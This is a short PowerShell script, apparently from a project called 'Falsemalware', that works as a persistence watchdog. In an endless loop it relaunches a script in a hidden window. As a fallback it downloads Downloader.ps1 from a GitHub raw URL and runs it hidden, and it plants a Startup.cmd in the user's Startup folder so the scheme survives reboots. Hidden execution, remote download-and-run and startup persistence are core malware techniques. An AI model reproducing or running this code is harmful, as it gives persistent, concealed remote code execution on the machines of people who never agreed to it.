


Start-Sleep(1)

$processName = "Powershell"
$processName2 = "pwsh"
$FileFalsemalware = "C:\temp\Falsemalware.ps1"
$FileDownloader = "C:\temp\Downloader.ps1"
$FileStartup = "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Startup.cmd"

do{
    do{
        $ProccesRunning = 0
        $Pro1 =Get-Process $processName -ErrorAction SilentlyContinue
        $Pro2 = Get-Process $processName2 -ErrorAction SilentlyContinue
        if ($null -ne $Pro1 -or $null -ne $Pro2){
            $global:ProccesRunning = 1
        } 
        else {  
            $global:ProccesRunning = 0
        }
        
        if ($ProccesRunning -ne 1) {
            try {
                Start-Process -FilePath PowerShell.exe -WindowStyle hidden -ArgumentList "-File $FileFalsemalware"   
            }
            catch {
                try {
                    Start-Process -FilePath PowerShell.exe -WindowStyle hidden -ArgumentList "-File $FileDownloader" 
                    Start-Sleep(1)
                    
                }
                catch{
                    $URL2 = "https://raw.githubusercontent.com/Freecil/Projects/main/Downloader.ps1"
                    Invoke-WebRequest -Uri $URL2 -OutFile $FileDownloader
                    Start-Process -FilePath PowerShell.exe -WindowStyle hidden -ArgumentList "-File $FileDownloader" 
                    Start-Sleep(1)
                    exit
                }
            }
        
        }
        
        $TestStartup = Test-Path -Path $FileStartup -PathType Leaf
        if ($null -eq $TestStartup) {
            $url4 = "https://raw.githubusercontent.com/Freecil/Projects/main/Startup.cmd"
            Invoke-WebRequest -Uri $url4 -OutFile $FileStartup
        }
      

        $timer++
        Start-Sleep(5)
    } until ($timer -gt 5000)
    $timer = 0
} until ($timer -gt 5000)
